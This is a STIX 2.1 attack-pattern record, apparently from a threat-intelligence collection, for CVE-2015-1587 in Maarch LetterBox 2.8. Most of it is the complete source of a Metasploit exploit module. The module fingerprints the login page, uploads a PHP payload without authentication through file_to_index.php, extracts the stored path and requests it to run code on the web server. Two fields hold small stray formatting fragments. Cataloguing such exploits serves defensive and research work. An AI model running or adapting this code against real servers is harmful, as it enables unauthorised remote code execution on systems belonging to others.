{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--0ee28acb-6fe6-4e8d-a741-8dfaa3694ef9",
    "created": "2024-08-14T17:12:11.863533Z",
    "modified": "2024-08-14T17:12:11.863537Z",
    "name": "Maarch LetterBox Unrestricted File Upload",
    "description": " This module exploits a file upload vulnerability on Maarch LetterBox 2.8 due to a lack of session and file validation in the file_to_index.php script. It allows unauthenticated users to upload files of any type and subsequently execute PHP scripts in the context of the web server.  'License'         => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/maarch_letterbox_file_upload.rb",
            "external_id": "maarch_letterbox_file_upload.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-1587"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'uri'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(\n      info,\n      'Name'            => 'Maarch LetterBox Unrestricted File Upload',\n      'Description'     => %q{\n        This module exploits a file upload vulnerability on Maarch LetterBox 2.8 due to a lack of\n        session and file validation in the file_to_index.php script. It allows unauthenticated\n        users to upload files of any type and subsequently execute PHP scripts in the context of\n        the web server.\n      },\n      'License'         => MSF_LICENSE,\n      'Author'          =>\n        [\n          'rastating'\n        ],\n      'References'      =>\n        [\n          ['CVE', '2015-1587']\n        ],\n      'DisclosureDate'  => '2015-02-11',\n      'Platform'        => 'php',\n      'Arch'            => ARCH_PHP,\n      'Targets'         => [['Maarch LetterBox 2.8', {}]],\n      'DefaultTarget'   => 0\n    ))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The base path to Maarch LetterBox', '/'])\n      ])\n  end\n\n  def letterbox_login_url\n    normalize_uri(target_uri.path, 'login.php')\n  end\n\n  def letterbox_upload_url\n    normalize_uri(target_uri.path, 'file_to_index.php')\n  end\n\n  def check\n    res = send_request_cgi('method' => 'GET', 'uri' => letterbox_login_url)\n    if res.nil? || res.code != 200\n      return Msf::Exploit::CheckCode::Unknown\n    elsif res.body.include?('alt=\"Maarch Maerys Archive v2.1 logo\"')\n      return Msf::Exploit::CheckCode::Appears\n    end\n\n    Msf::Exploit::CheckCode::Safe\n  end\n\n  def generate_mime_message(payload, name)\n    data = Rex::MIME::Message.new\n    data.add_part(payload.encoded, 'text/plain', 'binary', \"form-data; name=\\\"file\\\"; filename=\\\"#{name}\\\"\")\n    data\n  end\n\n  def exploit\n    print_status(\"Preparing payload...\")\n    payload_name = \"#{Rex::Text.rand_text_alpha(10)}.php\"\n    data = generate_mime_message(payload, payload_name)\n\n    print_status(\"Uploading payload...\")\n    res = send_request_cgi(\n      'method'    => 'POST',\n      'uri'       => letterbox_upload_url,\n      'ctype'     => \"multipart/form-data; boundary=#{data.bound}\",\n      'data'      => data.to_s\n    )\n    fail_with(Failure::Unreachable, 'No response from the target') if res.nil?\n    fail_with(Failure::UnexpectedReply, \"Server responded with status code #{res.code}\") if res.code != 200\n\n    print_status(\"Parsing server response...\")\n    captures = res.body.match(/\\[local_path\\] => (.*\\.php)/i).captures\n    fail_with(Failure::UnexpectedReply, 'Unable to parse the server response') if captures.nil? || captures[0].nil?\n    payload_url = normalize_uri(target_uri.path, captures[0])\n    print_good(\"Response parsed successfully\")\n\n    print_status(\"Executing the payload at #{payload_url}\")\n    register_files_for_cleanup(File.basename(URI.parse(payload_url).path))\n    send_request_cgi({ 'uri' => payload_url, 'method'  => 'GET' }, 5)\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-02-11",
    "x_mitre_platforms": [
        "php'"
    ]
}